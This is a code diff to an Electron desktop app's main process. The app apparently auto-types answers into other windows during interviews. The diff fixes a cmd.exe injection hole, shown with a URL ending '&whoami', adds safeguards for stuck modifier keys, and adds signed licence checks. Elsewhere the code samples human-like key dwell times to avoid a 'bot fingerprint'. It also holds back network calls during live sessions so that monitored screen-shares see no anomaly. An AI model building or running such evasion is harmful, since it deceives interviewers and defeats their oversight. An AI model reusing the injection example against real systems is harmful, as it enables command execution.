@@ -102,9 +102,20 @@ electronLog.transports.file.level = 'info';
 // which won't run if the process is exiting on an uncaught exception.
 // Without this branch, the spawned PowerShell orphans every crash and
 // accumulates in Task Manager.
+//
+// And we let go of every modifier key. An uncaught exception can tear out
+// of the middle of an Auto-Type chord — between the pressKey and the
+// releaseKey — and unlike a spawned process, a held Shift or Ctrl is OS
+// state that outlives us: the user's own next keystrokes become chords in
+// whatever editor has focus. Fire-and-forget with its rejection swallowed,
+// because this handler is synchronous and must not become the source of
+// the next fatal event.
 process.on('uncaughtException', (err) => {
   try { electronLog.error('UNCAUGHT EXCEPTION:', err && err.stack || err); } catch {}
   try { if (typeof killUIABridge === 'function') killUIABridge(); } catch {}
+  try {
+    if (typeof releaseAllModifiers === 'function') releaseAllModifiers().catch(() => {});
+  } catch {}
 });
 process.on('unhandledRejection', (reason) => {
   try { electronLog.error('UNHANDLED REJECTION:', reason && reason.stack || reason); } catch {}
@@ -816,6 +827,24 @@ function createMainWindow() {
     mainWindow.loadFile(path.join(__dirname, '../dist/index.html'));
   }
 
+  // ── Keep the Auto-Type entitlement claim warm ──
+  // Started here because this is the first moment the app has both a
+  // renderer to read the signed-in token from and a network it is allowed
+  // to use. Fire-and-forget by construction: the refresher waits 20s, skips
+  // itself entirely while a session is live, and swallows every failure —
+  // nothing in it can delay or break startup. It is idempotent, so the
+  // tray-restore / macOS-'activate' paths that call createMainWindow again
+  // do not stack a second timer. See autoTypeStartEntitlementRefresh.
+  //
+  // Wrapped because this call sits ~2,500 lines ABOVE the const declarations
+  // it depends on. That is fine today — every createMainWindow() call site is
+  // inside a callback, so the module has finished evaluating — but a future
+  // call during module evaluation would hit the temporal dead zone, and an
+  // entitlement refresher must never be the reason a window fails to open.
+  try { autoTypeStartEntitlementRefresh(); } catch (e) {
+    console.warn('[auto-type] entitlement refresher failed to start:', e && e.message);
+  }
+
   mainWindow.on('closed', () => {
     mainWindow = null;
     // Close popout if main closes
@@ -1087,9 +1116,11 @@ ipcMain.handle('get-desktop-sources', async () => {
 // staring at a forever-spinner during Google sign-in. This handler:
 //   1. Tries shell.openExternal first (the standard path)
 //   2. On failure, falls back to child_process spawn — on Windows that's
-//      `cmd /c start "" "URL"` which uses a different ShellExecute code
-//      path; if Win32 ShellExecuteEx is broken, this still often works
-//      because cmd's `start` resolves the protocol handler differently.
+//      `rundll32 url.dll,FileProtocolHandler <URL>`, which reaches the
+//      shell's protocol table down a different code path than Win32
+//      ShellExecuteEx; if ShellExecuteEx is broken, this still often
+//      works. It used to be `cmd /c start "" "URL"` — see the win32
+//      branch for why that had to go.
 //      On macOS we use `open <url>`, on Linux `xdg-open <url>`.
 //   3. Returns { ok, method, error, attempts } so the renderer can show
 //      the user what was tried and why it failed.
@@ -1134,11 +1165,42 @@ ipcMain.handle('open-external-robust', async (_event, url) => {
       let child;
       try {
         if (platform === 'win32') {
-          // The empty `""` is the start-command's title argument — without
-          // it, start would interpret a quoted URL as the title and
-          // silently do nothing. windowsHide:true keeps a cmd window from
-          // briefly flashing into view.
-          child = spawn('cmd.exe', ['/s', '/c', 'start', '""', url], {
+          // NOT `cmd.exe /s /c start "" <url>` any more, and it can never
+          // come back. Node hands argv to CreateProcess through libuv's
+          // quote_cmd_arg, which only quotes an argument containing a
+          // space, a tab or a quote — so an `&` inside the URL arrives at
+          // cmd RAW and cmd reads it as a command separator. `/s` turns off
+          // the quote-preserving rule on top of that. A URL of the shape
+          // `https://host/a&whoami` therefore truncated at the `&` and cmd
+          // EXECUTED the tail; reproduced by swapping `start` for `echo` —
+          // it printed the short URL and then printed machine\user. Neither
+          // guard above catches it: `new URL()` is perfectly happy with `&`
+          // in a path, and the protocol allowlist only looks at the scheme.
+          // (The lore for the old form, for anyone tempted: the empty `""`
+          // was start's title argument — without it start read the quoted
+          // URL as a window title and silently did nothing.)
+          //
+          // rundll32 takes the URL as a plain argv entry. There is no shell
+          // in the path, so there is no separator to inject and nothing to
+          // truncate, and url.dll,FileProtocolHandler goes through the same
+          // ShellExecute protocol table — it opens http/https AND mailto:,
+          // which matters because mailto: is in the allowlist above and is
+          // the case most likely to reach this fallback (a machine with no
+          // mail client registered fails method 1 every time).
+          //
+          // We pass parsed.href, not the raw renderer string: normalized and
+          // percent-encoded, so what actually launches is what we validated.
+          //
+          // Resolve the binary out of %SystemRoot%\System32 instead of
+          // trusting PATH — a PATH that has lost its System32 entry is a
+          // real Windows state, and it would turn this fallback into a
+          // pointless ENOENT. windowsHide:true keeps any console window
+          // from flashing into view.
+          const sysRoot = process.env.SystemRoot || process.env.windir;
+          const rundll32Exe = sysRoot
+            ? path.join(sysRoot, 'System32', 'rundll32.exe')
+            : 'rundll32.exe';
+          child = spawn(rundll32Exe, ['url.dll,FileProtocolHandler', parsed.href], {
             detached: true,
             stdio: 'ignore',
             windowsHide: true,
@@ -2193,15 +2255,80 @@ function autoTypeSampleDwell(ch) {
   return Math.max(30, Math.min(180, Math.round(d)));
 }
 
+// ── Hold a key, and ALWAYS let go of it ──
+// pressKey and releaseKey are two separate OS events with our own code in
+// between, so anything that throws in the middle leaves the key PHYSICALLY
+// DOWN — the OS has no idea we gave up. And these calls do throw in the
+// field: see the note further down about libnut's "Invalid key flag" on
+// some Windows builds, and a focus change mid-chord does it too. With
+// Shift or Ctrl stuck down, the rest of the answer types as chords (Ctrl+A,
+// Ctrl+S, Ctrl+W) or as capitals, and — the part that really hurts — the
+// modifier stays down after the run ends, so the USER's own keystrokes are
+// chords too, mid-interview, in someone else's editor.
+//
+// So every hold in this file goes through here and the release lives in a
+// finally. The press is inside the try as well: if pressKey itself half-
+// fails we'd rather emit a redundant keyup (a no-op at OS level for a key
+// that isn't down) than gamble on it. The release is swallowed so a failing
+// release can never mask the original error — the caller still sees the
+// real throw, and every existing catch-and-continue behaves as before.
+//
+// Timing is the caller's business: whatever fn awaits IS the dwell, so the
+// deliberate distinction between 0ms and a sampled dwell survives intact.
+async function withHeldKey(keyboard, key, fn) {
+  try {
+    await keyboard.pressKey(key);
+    return await fn();
+  } finally {
+    try { await keyboard.releaseKey(key); } catch (_) {}
+  }
+}
+
+// ── The belt to withHeldKey's braces ──
+// The per-hold finally covers the normal unwind. A hard fault — an uncaught
+// exception tearing through the middle of a chord — can still get past it,
+// and that state OUTLIVES the run. So we sweep every modifier at the end of
+// every Auto-Type run and from the uncaughtException net.
+//
+// Only ever uses the already-memoized nut handle. It must NEVER call
+// loadNut(): both callers are last-resort paths, and pulling a native .node
+// in from an exception handler is exactly how a bad moment becomes a worse
+// one. If Auto-Type never ran, nothing is held and there is nothing to do.
+//
+// Every release is individually swallowed, and unknown key names are skipped
+// — nut-js builds differ on which Right*/Super keys exist, and one missing
+// enum entry must not stop the sweep from reaching the rest. Being async,
+// nothing in here can throw synchronously at a caller either; the worst case
+// is a rejected promise, and both call sites .catch() it.
+//
+// The name list is local on purpose: a module-scope const would sit in its
+// temporal dead zone if an uncaughtException fired while this file was still
+// evaluating, and this is the one path that has to survive that.
+async function releaseAllModifiers() {
+  const nut = _nut;
+  if (!nut || !nut.keyboard || !nut.Key) return;
+  const names = [
+    'LeftShift', 'RightShift',
+    'LeftControl', 'RightControl',
+    'LeftAlt', 'RightAlt',
+    'LeftSuper', 'RightSuper',
+  ];
+  for (const name of names) {
+    const k = nut.Key[name];
+    if (k === undefined || k === null) continue;
+    try { await nut.keyboard.releaseKey(k); } catch (_) { /* best effort */ }
+  }
+}
+
 // Press a single keystroke with sampled dwell. Used for one-off keys like
 // Backspace, Enter, Tab, arrows, etc — anywhere we'd previously do
 // `pressKey(K); releaseKey(K);` back-to-back (0ms dwell — the bot fingerprint).
 async function autoTypePressWithDwell(keyboard, key) {
   const d = autoTypeLogNormal(85, 0.30);
   const dwell = Math.max(30, Math.min(180, Math.round(d)));
-  await keyboard.pressKey(key);
-  await autoTypeSleep(dwell);
-  await keyboard.releaseKey(key);
+  await withHeldKey(keyboard, key, async () => {
+    await autoTypeSleep(dwell);
+  });
 }
 
 // Type a single CHARACTER (letter/digit/punctuation) with real dwell time.
@@ -2223,17 +2350,21 @@ async function typeCharHumanly(keyboard, Key, ch) {
     if (mapping.shift) {
       // Press Shift, brief settle (real Shift hold overlaps key press),
       // then press the key with dwell, release key, release Shift.
-      await keyboard.pressKey(Key.LeftShift);
-      await autoTypeSleep(12 + Math.random() * 18);
-      await keyboard.pressKey(keyObj);
-      await autoTypeSleep(dwell);
-      await keyboard.releaseKey(keyObj);
-      await autoTypeSleep(6 + Math.random() * 14);
-      await keyboard.releaseKey(Key.LeftShift);
+      // Both holds go through withHeldKey: the inner finally runs before
+      // the outer one, and BOTH run before the catch below — which matters
+      // enormously here, because that catch calls keyboard.type(ch) and it
+      // used to do so with Shift still held.
+      await withHeldKey(keyboard, Key.LeftShift, async () => {
+        await autoTypeSleep(12 + Math.random() * 18);
+        await withHeldKey(keyboard, keyObj, async () => {
+          await autoTypeSleep(dwell);
+        });
+        await autoTypeSleep(6 + Math.random() * 14);
+      });
     } else {
-      await keyboard.pressKey(keyObj);
-      await autoTypeSleep(dwell);
-      await keyboard.releaseKey(keyObj);
+      await withHeldKey(keyboard, keyObj, async () => {
+        await autoTypeSleep(dwell);
+      });
     }
   } catch (e) {
     console.warn('[auto-type] typeCharHumanly manual press failed for', JSON.stringify(ch), ':', e && e.message);
@@ -2759,7 +2890,766 @@ ipcMain.on('auto-type:abort', () => {
   }
 });
 
-ipcMain.handle('auto-type:send', async (_event, payload) => {
+// ───────────────────────────────────────────────
+//  Auto-Type hardening — who may ask, how much, and whether they paid
+//
+//  Everything below exists because 'auto-type:send' is not really an IPC
+//  message, it is an OS-wide keystroke-injection primitive with a preload
+//  allowlist entry in front of it. It types into whatever window the OS
+//  has focused — a terminal, an SSH session, a password manager — after
+//  hiding our own window so the user is looking at the target. Three
+//  things were missing: nobody checked WHO asked, nobody checked HOW MUCH
+//  they asked for, and the "this is an Ultra feature" gate lived entirely
+//  in localStorage, where a text editor is a valid unlock tool.
+// ───────────────────────────────────────────────
+
+// A generous but finite ceiling on payload.code. A 500-line source file is
+// roughly 15 KB, so 100 KB is far past any real interview answer — the
+// point is only that the number exists. An unbounded string here is an
+// unbounded keystroke stream, and the user cannot type faster than it.
+const AT_MAX_CODE_BYTES = 100 * 1024;
+
+// How long a server-proven entitlement stays good with no further contact.
+// Interviews happen on hotel wifi and on monitored corporate networks where
+// Local-Only mode suppresses outbound calls on purpose, so "must be online
+// every time" would break the feature for the people who paid for it. Seven
+// days is the compromise: one online run buys a week of offline runs.
+const AT_ENTITLEMENT_GRACE_MS = 7 * 24 * 60 * 60 * 1000;
+// The probe is fired in parallel with the 3s countdown, so anything under
+// ~3s is invisible to the user. Past that we stop waiting and fall back to
+// the cached grant (or refuse, if there isn't one).
+const AT_ENTITLEMENT_PROBE_TIMEOUT_MS = 6000;
+
+// ── Who may ask ──
+// The invoke must come from the TOP frame of a window WE own. Two separate
+// questions, both of which have to be yes:
+//   1. is the WebContents one of ours (main window or popout)? — this is
+//      what stops any other WebContents we might open later (an OAuth
+//      window, a docs viewer, a future embedded browser) from reaching the
+//      keyboard just because it happens to share a preload;
+//   2. is the sending frame the top frame? — a subframe is embedded content
+//      we did not author (an iframe, an ad, an embedded doc), and embedded
+//      content must never be able to type into the user's terminal.
+// senderFrame can legitimately be null (the frame navigated or died between
+// the send and our handler), and touching a destroyed WebFrameMain throws —
+// both cases resolve to "not trusted", which is the safe direction.
+function autoTypeSenderIsTrusted(event) {
+  try {
+    const sender = event && event.sender;
+    if (!sender || sender.isDestroyed()) return false;
+    const ownsSender =
+      (mainWindow && !mainWindow.isDestroyed() && sender === mainWindow.webContents) ||
+      (popoutWindow && !popoutWindow.isDestroyed() && sender === popoutWindow.webContents);
+    if (!ownsSender) return false;
+    const frame = event.senderFrame;
+    if (!frame) return false;
+    // `parent` is null for a top-level frame. `top` is the belt to that
+    // suspenders — it exists on WebFrameMain in this Electron line, but we
+    // only assert on it when it's actually there so a future API shift
+    // degrades to the parent check rather than to "deny everything".
+    if (frame.parent) return false;
+    if (frame.top && frame.top !== frame) return false;
+    return true;
+  } catch (_) {
+    // Destroyed frame, revoked object, anything at all — deny.
+    return false;
+  }
+}
+
+// ── Did they pay? ──
+// The renderer is no longer believed about tier. gates.autoType comes from
+// JSON.parse(localStorage['minicaai_license']) and user.is_admin from the
+// same blob flips the effective tier to 'ultra' outright, so the client-side
+// gate is decoration. The ONE real gate in the system is server-side:
+// /api/v1/ai/autotype-plan is mounted behind requireTier('ultra'). We reuse
+// it as an entitlement probe rather than inventing a new endpoint — and we
+// POST a body with NO `code` field on purpose, so the tier middleware runs
+// (that is the entire thing we want) and the route itself bails at its own
+// `code is required` 400 before spending a Haiku call. What we learn:
+//
+//   401 / 402 / 403 → the server said NO. Abort the run, type nothing.
+//                     This is the line that matters: main.cjs used to treat
+//                     ANY non-OK planner response as "fine, use the
+//                     deterministic fallback" and typed anyway, so a 403
+//                     from the only real gate in the product was a
+//                     no-op.
+//   2xx / 400 / 422 → the tier middleware PASSED (a 400 can only come from
+//                     the handler, which runs after it). Entitlement proven.
+//   404 / 5xx / net → we learned nothing. NOT a denial — an old server, a
+//                     cold start, or airport wifi must not look like fraud.
+//
+// A proven entitlement is cached under userData. We never cache a denial as
+// an allow, and an explicit tier denial DELETES the cached allow so a grace
+// window can't outlive a cancelled subscription.
+function autoTypeEntitlementFile() {
+  return path.join(app.getPath('userData'), 'autotype-entitlement.json');
+}
+
+// Cache key: the user id out of the JWT when we can read one, otherwise a
+// fingerprint of the token itself. The JWT is NOT verified here and does not
+// need to be — this is a lookup key, not a credential. A forged key can only
+// ever find an entry that a real server grant wrote for that same id on this
+// same machine. Preferring the id over the raw token means the cache
+// survives token rotation (/license/validate rotates tokens every ~30 min),
+// which is exactly the user who is entitled and about to go offline.
+function autoTypeIdentityKey(authToken) {
+  if (!authToken) return null;
+  try {
+    const seg = String(authToken).split('.')[1];
+    if (seg) {
+      const json = JSON.parse(Buffer.from(seg.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf8'));
+      const id = json && (json.id != null ? json.id : (json.sub != null ? json.sub : json.userId));
+      if (id != null && String(id).length) return `u:${String(id)}`;
+    }
+  } catch (_) { /* not a JWT — fall through to the fingerprint */ }
+  try {
+    return 't:' + require('crypto').createHash('sha256').update(String(authToken)).digest('hex').slice(0, 16);
+  } catch (_) {
+    return null;
+  }
+}
+
+function autoTypeReadEntitlementCache() {
+  try {
+    const raw = fs.readFileSync(autoTypeEntitlementFile(), 'utf8');
+    const parsed = JSON.parse(raw);
+    if (parsed && typeof parsed === 'object' && parsed.entries && typeof parsed.entries === 'object') return parsed;
+  } catch (_) { /* missing or corrupt — treated as "never verified" */ }
+  return { v: 1, entries: {} };
+}
+
+// Returns { ageMs } for a still-valid grant, or null. A null key means we
+// have no token to key on (signed out, or an old renderer): in that case any
+// fresh grant on this machine counts. That is deliberate — the grant proves
+// "this installation was verified Ultra recently", which is the property we
+// actually care about, and it keeps a user whose token vanished from being
+// locked out mid-interview.
+function autoTypeCachedEntitlement(key) {
+  const cache = autoTypeReadEntitlementCache();
+  const now = Date.now();
+  const fresh = (e) => e && e.ok === true && typeof e.at === 'number' && (now - e.at) >= 0 && (now - e.at) < AT_ENTITLEMENT_GRACE_MS;
+  if (key) {
+    const entry = cache.entries[key];
+    return fresh(entry) ? { ageMs: now - entry.at, key } : null;
+  }
+  for (const [k, entry] of Object.entries(cache.entries)) {
+    if (fresh(entry)) return { ageMs: now - entry.at, key: k };
+  }
+  return null;
+}
+
+function autoTypeRememberEntitlement(key) {
+  if (!key) return;
+  try {
+    const cache = autoTypeReadEntitlementCache();
+    cache.entries[key] = { ok: true, at: Date.now() };
+    // Bound the file. Nobody signs into more than a handful of accounts on
+    // one machine, and an unbounded map here would be a slow disk leak.
+    const keys = Object.keys(cache.entries);
+    if (keys.length > 8) {
+      keys.sort((a, b) => (cache.entries[a].at || 0) - (cache.entries[b].at || 0));
+      for (const k of keys.slice(0, keys.length - 8)) delete cache.entries[k];
+    }
+    fs.writeFileSync(autoTypeEntitlementFile(), JSON.stringify(cache), 'utf8');
+  } catch (e) {
+    // Best-effort. A machine that can't write here just re-verifies online
+    // every run, which is inconvenient, never unsafe.
+    console.warn('[auto-type] could not persist entitlement:', e && e.message);
+  }
+}
+
+function autoTypeForgetEntitlement(key) {
+  if (!key) return;
+  try {
+    const cache = autoTypeReadEntitlementCache();
+    if (cache.entries[key]) {
+      delete cache.entries[key];
+      fs.writeFileSync(autoTypeEntitlementFile(), JSON.stringify(cache), 'utf8');
+    }
+  } catch (_) { /* best-effort */ }
+}
+
+// ───────────────────────────────────────────────
+//  The SIGNED claim — a grant we can verify but cannot mint
+//
+//  Everything above this line is honest bookkeeping, not proof. The cached
+//  grant is {ok:true, at:<ms>} in a JSON file under the user's own userData
+//  directory, which means "have I paid?" was answerable with a text editor
+//  and the seven-day grace window was a seven-day hole. The server now hands
+//  back the same verdict as an Ed25519-signed claim from
+//  GET /api/v1/license/entitlements, and this is the half that checks it.
+//
+//  Why ASYMMETRIC: the desktop app must be able to VERIFY a claim without
+//  being able to MINT one. An HMAC needs the same secret on both ends, and a
+//  secret compiled into a binary that runs on the attacker's machine is not
+//  a secret — it is one `strings` away from being an Ultra key generator.
+//  With Ed25519 the private half never leaves the server env and the worst
+//  anyone can do with the constant below is check somebody else's claim,
+//  which is why it is safe to ship in plain sight.
+// ───────────────────────────────────────────────
+const AT_ENTITLEMENT_PUBLIC_KEY_B64 = 'MCowBQYDK2VwAyEA1I54O1cf6oxYxxuRVrFORRb0NZzchmPtodRI4Llqc/Y=';
+
+// undefined = not parsed yet, null = parsed and unusable. Lazy + memoized
+// for the same reason the server parses its half lazily: a bad constant must
+// degrade to "no signed claims, use the probe", never to a throw on the
+// module's load path.
+let _atClaimPublicKey;
+function autoTypeClaimPublicKey() {
+  if (_atClaimPublicKey !== undefined) return _atClaimPublicKey;
+  try {
+    const key = require('crypto').createPublicKey({
+      key: Buffer.from(AT_ENTITLEMENT_PUBLIC_KEY_B64, 'base64'),
+      format: 'der',
+      type: 'spki',
+    });
+    // Buffer.from(..., 'base64') silently drops anything outside the
+    // alphabet, so a mangled paste can still yield a DER blob that parses
+    // into SOMETHING. Insist on the curve we are actually verifying against.
+    _atClaimPublicKey = key.asymmetricKeyType === 'ed25519' ? key : null;
+  } catch (_) {
+    _atClaimPublicKey = null;
+  }
+  return _atClaimPublicKey;
+}
+
+// The verification. Returns the decoded claim object when the envelope is
+// genuine, unexpired and belongs to `expectedSub`; otherwise null — which
+// every caller reads as "we hold no signed claim", NOT as a denial. Never
+// throws: this parses a file sitting on the user's own disk, so garbage in
+// has to mean null out rather than an exception on the keystroke path.
+//
+// WHAT BYTES ARE CHECKED — the single most load-bearing detail in this file.
+// The signature covers the ASCII characters of the base64url payload STRING
+// exactly as transmitted, not the decoded object and not a re-encoding of
+// it. JSON.stringify has no canonical key order across versions, languages,
+// or a well-meaning refactor that reorders a literal, so a verifier that
+// parses and re-serializes before checking is a verifier that fails at
+// random. Check the characters we received; decode afterwards, only to READ.
+function autoTypeVerifySignedClaim(envelope, expectedSub, nowMs) {
+  try {
+    if (!envelope || typeof envelope !== 'object') return null;
+    // `alg` and `v` sit OUTSIDE the signature, so they prove nothing — they
+    // only say whether this is a shape we understand. Pinning them means a
+    // future envelope format lands as "no claim" (fall back to the probe)
+    // instead of as a confident misparse.
+    if (envelope.alg !== 'ed25519' || envelope.v !== 1) return null;
+    const payloadB64 = envelope.payload;
+    const sigB64 = envelope.sig;
+    if (typeof payloadB64 !== 'string' || typeof sigB64 !== 'string') return null;
+    // base64url decoding SILENTLY DISCARDS out-of-alphabet bytes, so a
+    // truncated or hand-edited file would otherwise decode to a shorter but
+    // perfectly valid-looking buffer. Insist on the exact charset first.
+    if (!/^[A-Za-z0-9_-]+$/.test(payloadB64) || !/^[A-Za-z0-9_-]+$/.test(sigB64)) return null;
+    const pub = autoTypeClaimPublicKey();
+    if (!pub) return null;
+    const sig = Buffer.from(sigB64, 'base64url');
+    if (sig.length !== 64) return null;  // Ed25519 signatures are fixed-width
+    // Ed25519 takes a NULL algorithm — the curve fixes its own hash (SHA-512,
+    // internally, over the whole message). Passing 'sha256' here throws.
+    if (!require('crypto').verify(null, Buffer.from(payloadB64, 'ascii'), pub, sig)) return null;
+    const claim = JSON.parse(Buffer.from(payloadB64, 'base64url').toString('utf8'));
+    if (!claim || typeof claim !== 'object') return null;
+    // Payload version, this one INSIDE the signature. A bump means the
+    // server changed what these fields mean, and the right response to that
+    // is to stop trusting our reading of them and fall back to the probe —
+    // not to guess.
+    if (claim.v !== 1) return null;
+    if (typeof claim.autoType !== 'boolean') return null;
+    if (typeof claim.exp !== 'number' || !(claim.exp > nowMs)) return null;
+    // Bind the claim to THIS account. Copying the file to another machine or
+    // another login is the obvious next attack after editing it, and this is
+    // what makes it worthless. expectedSub is null only when we cannot read
+    // a user id at all (signed out, or a token that isn't a JWT) — see
+    // autoTypeReadSignedClaim for why that case still honours a claim rather
+    // than locking someone out mid-interview.
+    if (expectedSub != null && String(claim.sub) !== String(expectedSub)) return null;
+    return claim;
+  } catch (_) {
+    // Malformed JSON, a truncated file, an OpenSSL build without Ed25519 —
+    // every one of them means "no signed claim", never a crash.
+    return null;
+  }
+}
+
+// The raw user id out of the JWT, unprefixed — which is what the claim's
+// `sub` carries. Distinct from autoTypeIdentityKey above, which returns a
+// namespaced CACHE key ('u:123', or a token fingerprint when the token
+// isn't a JWT); neither of those forms is something a server would ever put
+// in `sub`, so comparing against it would fail every claim.
+function autoTypeTokenUserId(authToken) {
+  if (!authToken) return null;
+  try {
+    const seg = String(authToken).split('.')[1];
+    if (!seg) return null;
+    const json = JSON.parse(Buffer.from(seg.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf8'));
+    const id = json && (json.id != null ? json.id : (json.sub != null ? json.sub : json.userId));
+    if (id != null && String(id).length) return String(id);
+  } catch (_) { /* not a JWT — there is no id to bind to */ }
+  return null;
+}
+
+// Signed claims live in the SAME file as the unsigned grants, under their
+// own `claims` map. One file, one read — and the existing reader already
+// ignores unknown top-level keys, so a claim written by this build simply
+// rides along beside the `entries` an older build would still understand.
+function autoTypeClaimsOf(cache) {
+  const claims = cache && cache.claims;
+  return (claims && typeof claims === 'object') ? claims : {};
+}
+
+function autoTypeStoreSignedClaim(key, envelope) {
+  if (!key || !envelope) return;
+  try {
+    const cache = autoTypeReadEntitlementCache();
+    const claims = autoTypeClaimsOf(cache);
+    // `at` is our local wall-clock and is OUTSIDE the signature on purpose.
+    // It is used for exactly one thing — deciding how stale a DENIAL is —
+    // and it can never grant access, so editing it buys an attacker nothing.
+    claims[key] = {
+      payload: envelope.payload,
+      sig: envelope.sig,
+      alg: envelope.alg,
+      v: envelope.v,
+      at: Date.now(),
+    };
+    // Same bound as the unsigned entries: nobody signs into more than a
+    // handful of accounts on one machine, and an unbounded map is a slow
+    // disk leak.
+    const keys = Object.keys(claims);
+    if (keys.length > 8) {
+      keys.sort((a, b) => (claims[a].at || 0) - (claims[b].at || 0));
+      for (const k of keys.slice(0, keys.length - 8)) delete claims[k];
+    }
+    cache.claims = claims;
+    fs.writeFileSync(autoTypeEntitlementFile(), JSON.stringify(cache), 'utf8');
+  } catch (e) {
+    // Best-effort, exactly like the unsigned cache: a machine that cannot
+    // write here just re-verifies online, which is inconvenient, never
+    // unsafe.
+    console.warn('[auto-type] could not persist signed entitlement claim:', e && e.message);
+  }
+}
+
+// Drop a signed claim outright. Deliberately SEPARATE from
+// autoTypeForgetEntitlement: the signed-denial path below drops the unsigned
+// grant and must KEEP the signed denial (that denial is the record — it is
+// the thing making the downgrade stick), whereas an explicit 402/403 from a
+// live route means whatever claim we hold has been overtaken by events.
+function autoTypeForgetSignedClaim(key) {
+  if (!key) return;
+  try {
+    const cache = autoTypeReadEntitlementCache();
+    const claims = autoTypeClaimsOf(cache);
+    if (claims[key]) {
+      delete claims[key];
+      cache.claims = claims;
+      fs.writeFileSync(autoTypeEntitlementFile(), JSON.stringify(cache), 'utf8');
+    }
+  } catch (_) { /* best-effort */ }
+}
+
+// The read side. Returns { claim, key, storedAt } for a claim that verifies
+// right now, or null. Note that verification happens on EVERY read, not once
+// at write time: the file lives on the user's own disk, so "it verified when
+// we stored it" says nothing about what is in it a minute later.
+function autoTypeReadSignedClaim(authToken) {
+  try {
+    const sub = autoTypeTokenUserId(authToken);
+    const key = autoTypeIdentityKey(authToken);
+    const cache = autoTypeReadEntitlementCache();
+    const claims = autoTypeClaimsOf(cache);
+    const now = Date.now();
+    if (key) {
+      const env = claims[key];
+      if (!env) return null;
+      const claim = autoTypeVerifySignedClaim(env, sub, now);
+      if (!claim) return null;
+      return { claim, key, storedAt: typeof env.at === 'number' ? env.at : 0 };
+    }
+    // No key at all — signed out, or a token we cannot read an id from. We
+    // still honour a claim that VERIFIES and has not expired: it is
+    // server-signed proof that this installation was entitled inside the
+    // claim's lifetime, the same property autoTypeCachedEntitlement asserts
+    // in this case, except this one cannot be written by hand. Refusing here
+    // would lock out the user whose token vanished mid-interview, which is
+    // the exact failure the whole grace mechanism exists to prevent. Only
+    // ALLOWs are honoured on this path — a denial minted for some other
+    // account must never deny the person sitting here.
+    for (const [k, env] of Object.entries(claims)) {
+      const claim = autoTypeVerifySignedClaim(env, null, now);
+      if (claim && claim.autoType === true) {
+        return { claim, key: k, storedAt: typeof env.at === 'number' ? env.at : 0 };
+      }
+    }
+    return null;
+  } catch (_) {
+    return null;
+  }
+}
+
+// ── Keeping the claim warm ──
+// How long a fetched claim is left alone. The claim is good for seven days,
+// so refreshing on every cold launch would be six days of requests that
+// change nothing — we only go back inside the last day of its life.
+const AT_CLAIM_REFRESH_MARGIN_MS = 24 * 60 * 60 * 1000;
+// A DENIAL is re-checked far more eagerly than a grant, and the asymmetry is
+// the whole point: a stale grant costs us at most a week of a feature
+// somebody stopped paying for, while a stale denial costs a user who paid
+// five minutes ago and is being told no. An hour is short enough that
+// "upgrade, then use it" works without a reinstall.
+const AT_CLAIM_DENIAL_RECHECK_MS = 60 * 60 * 1000;
+// First refresh well after launch. The app is painting, restoring sessions
+// and running an update check; this is the least urgent network call in the
+// process and it gets the last slot. The later entries cover the renderer
+// still loading at 20s and the user signing in a few minutes into the
+// session — see autoTypeStartEntitlementRefresh for why one shot isn't
+// enough.
+const AT_CLAIM_STARTUP_DELAYS_MS = [20 * 1000, 2 * 60 * 1000, 10 * 60 * 1000, 30 * 60 * 1000];
+const AT_CLAIM_REFRESH_INTERVAL_MS = 6 * 60 * 60 * 1000;
+// The claim endpoint is one database read and one signature — no model call,
+// nothing to wait on. A missed refresh is a non-event, so the timeout is
+// short on purpose.
+const AT_CLAIM_FETCH_TIMEOUT_MS = 6000;
+
+async function autoTypeFetchSignedClaim(authToken) {
+  const controller = new AbortController();
+  const timer = setTimeout(() => { try { controller.abort(); } catch (_) {} }, AT_CLAIM_FETCH_TIMEOUT_MS);
+  try {
+    const res = await fetch(`${API_BASE}/api/v1/license/entitlements`, {
+      method: 'GET',
+      headers: {
+        'Authorization': `Bearer ${authToken}`,
+        'Accept': 'application/json',
+      },
+      signal: controller.signal,
+    });
+    if (res.status !== 200) {
+      // 501 means the server has no signing key configured yet, and it is
+      // the only non-200 worth naming: it says "fall back to the unsigned
+      // probe", not "this user is unentitled". 401 / 404 / 429 / 5xx all
+      // collapse to the same thing here — we learned nothing, so we keep
+      // whatever claim we already hold. Drain the tiny body so the socket
+      // goes back to the pool instead of waiting on GC.
+      try { await res.text(); } catch (_) {}
+      return { status: res.status };
+    }
+    const body = await res.json();
+    return { status: 200, envelope: body };
+  } catch (e) {
+    return { status: 0, error: e && e.message ? e.message : String(e) };
+  } finally {
+    clearTimeout(timer);
+  }
+}
+
+function autoTypeClaimNeedsRefresh(authToken) {
+  const signed = autoTypeReadSignedClaim(authToken);
+  if (!signed) return true;
+  if (signed.claim.autoType !== true) {
+    return (Date.now() - (signed.storedAt || 0)) > AT_CLAIM_DENIAL_RECHECK_MS;
+  }
+  return (signed.claim.exp - Date.now()) < AT_CLAIM_REFRESH_MARGIN_MS;
+}
+
+// Fetch + verify + store. Returns a promise that ALWAYS resolves — callers
+// are timers and startup hooks with nobody watching, and an unhandled
+// rejection in the main process is a native error dialog on top of whatever
+// the user was doing.
+async function autoTypeRefreshSignedClaim(authToken, reason) {
+  try {
+    if (!authToken) return false;
+    // Never mid-interview. A background HTTPS call to a licensing domain
+    // forty minutes into a monitored screen-share is precisely the anomaly
+    // Local-Only mode exists to avoid, and nothing here is urgent enough to
+    // be worth it — the claim lasts a week and the next tick is hours away,
+    // long after the session ends. Same sessionActive gate the updater and
+    // the tray notifications use.
+    if (sessionActive) return false;
+    if (!autoTypeClaimNeedsRefresh(authToken)) return false;
+    const key = autoTypeIdentityKey(authToken);
+    if (!key) return false;
+    const res = await autoTypeFetchSignedClaim(authToken);
+    if (res.status !== 200 || !res.envelope) {
+      console.log(`[auto-type] entitlement claim refresh (${reason}): nothing learned (${res.status === 501 ? 'server has no signing key yet — unsigned probe still in charge' : (res.status ? 'HTTP ' + res.status : res.error || 'network error')})`);
+      return false;
+    }
+    const claim = autoTypeVerifySignedClaim(res.envelope, autoTypeTokenUserId(authToken), Date.now());
+    if (!claim) {
+      // A 200 that does not verify is not a mild problem — it is a rotated
+      // key pair, the wrong API base, or something on the wire rewriting our
+      // responses. Never store it, and say so loudly enough to debug from a
+      // user's log.
+      console.warn('[auto-type] entitlement claim refresh: server returned a claim that did NOT verify against the shipped public key — ignoring it');
+      return false;
+    }
+    autoTypeStoreSignedClaim(key, res.envelope);
